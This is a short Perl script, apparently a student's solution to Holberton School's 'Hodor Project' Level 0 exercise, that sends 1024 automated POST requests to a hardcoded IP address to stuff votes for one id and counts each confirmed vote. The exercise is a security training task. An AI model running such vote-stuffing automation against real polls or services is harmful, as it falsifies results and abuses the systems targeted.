#!/usr/bin/perl
use strict;
use warnings;
use LWP::UserAgent;

=pod
 * ===---Description------------------------------------------------------------===
 *   Solution for the Hodor Project, Level 0 by Julien Barbier.
 *   Using a simple Perl script.
 *
 *   by Alexandro de Oliveira, for Holberton School
 * ===---------------------------------------------------------------------------===
=cut

# LWP is the "Library for WWW in Perl":
my $ua  = LWP::UserAgent->new();

# Defining the User-Agent:
$ua->agent("havk64 - Perl Requests");

my $url = 'http://173.246.108.142/level0.php';
my $counter = 1; # Initializing the counter.
for(my $i = 0; $i < (1 << 10); $i++) {
    my $request = $ua->post($url, { id => "23", holdthedoor => 'submit'});
    # To print the server headers:
    # print $request->headers_as_string;
    if($request->content =~ m/I voted!/) { # Using regexp to check if the vote was confirmed.
        print "Vote number: $counter\n";
        $counter++;
    } else {
        print "Connection error...(vote not computed)";
    }
    # To print the body:
    # print $request->decoded_content();
}
